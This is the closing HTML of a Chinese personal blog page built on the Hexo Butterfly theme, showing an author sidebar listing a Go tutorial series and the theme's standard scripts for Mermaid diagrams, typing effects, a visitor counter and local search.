text-center"><div class="avatar-img"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Hundredsu</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">27</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">8</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Hundredsu"><i class="fab fa-github"></i><span>关注我</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/Hundredsu" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">这是Hundredsu的博客,随缘更新</div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/post/b6e82410.html" title="5、并发编程">5、并发编程</a><time datetime="2025-08-07T13:57:12.000Z" title="发表于 2025-08-07 21:57:12">2025-08-07</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/post/5715da98.html" title="4、函数&amp;字符串格式化&amp;条件控制&amp;结构体">4、函数&amp;字符串格式化&amp;条件控制&amp;结构体</a><time datetime="2025-08-07T13:57:10.000Z" title="发表于 2025-08-07 21:57:10">2025-08-07</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/post/8b3c7b5f.html" title="3、数组与切片、指针、类型转换、字符串常用函数">3、数组与切片、指针、类型转换、字符串常用函数</a><time datetime="2025-08-07T13:57:09.000Z" title="发表于 2025-08-07 21:57:09">2025-08-07</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/post/3beb5b8d.html" title="2、初始函数与基本类型">2、初始函数与基本类型</a><time datetime="2025-08-07T13:57:08.000Z" title="发表于 2025-08-07 21:57:08">2025-08-07</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/post/347fb1ae.html" title="1、环境配置和编辑器使用">1、环境配置和编辑器使用</a><time datetime="2025-08-07T13:57:07.000Z" title="发表于 2025-08-07 21:57:07">2025-08-07</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;2020 - 2025 By Hundredsu</span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.3.4"></script><script src="/js/main.js?v=5.3.4"></script><div class="js-pjax"><script>(() => {
+  const runMermaid = ele => {
+    window.loadMermaid = true
+    const theme = document.documentElement.getAttribute('data-theme') === 'dark' ? 'dark' : 'default'
+
+    ele.forEach((item, index) => {
+      const mermaidSrc = item.firstElementChild
+      const mermaidThemeConfig = `%%{init:{ 'theme':'${theme}'}}%%\n`
+      const mermaidID = `mermaid-${index}`
+      const mermaidDefinition = mermaidThemeConfig + mermaidSrc.textContent
+
+      const renderFn = mermaid.render(mermaidID, mermaidDefinition)
+      const renderMermaid = svg => {
+        mermaidSrc.insertAdjacentHTML('afterend', svg)
+      }
+
+      // mermaid v9 and v10 compatibility
+      typeof renderFn === 'string' ? renderMermaid(renderFn) : renderFn.then(({ svg }) => renderMermaid(svg))
+    })
+  }
+
+  const codeToMermaid = () => {
+    const codeMermaidEle = document.querySelectorAll('pre > code.mermaid')
+    if (codeMermaidEle.length === 0) return
+
+    codeMermaidEle.forEach(ele => {
+      const preEle = document.createElement('pre')
+      preEle.className = 'mermaid-src'
+      preEle.hidden = true
+      preEle.textContent = ele.textContent
+      const newEle = document.createElement('div')
+      newEle.className = 'mermaid-wrap'
+      newEle.appendChild(preEle)
+      ele.parentNode.replaceWith(newEle)
+    })
+  }
+
+  const loadMermaid = () => {
+    if (false) codeToMermaid()
+    const $mermaid = document.querySelectorAll('#article-container .mermaid-wrap')
+    if ($mermaid.length === 0) return
+
+    const runMermaidFn = () => runMermaid($mermaid)
+    btf.addGlobalFn('themeChange', runMermaidFn, 'mermaid')
+    window.loadMermaid ? runMermaidFn() : btf.getScript('https://cdn.jsdelivr.net/npm/mermaid@11.4.1/dist/mermaid.min.js').then(runMermaidFn)
+  }
+
+  btf.addGlobalFn('encrypt', loadMermaid, 'mermaid')
+  window.pjax ? loadMermaid() : document.addEventListener('DOMContentLoaded', loadMermaid)
+})()</script></div><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.4/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = true;
+document.body.addEventListener('input', POWERMODE);
+</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=5.3.4"></script></div></div></body></html>
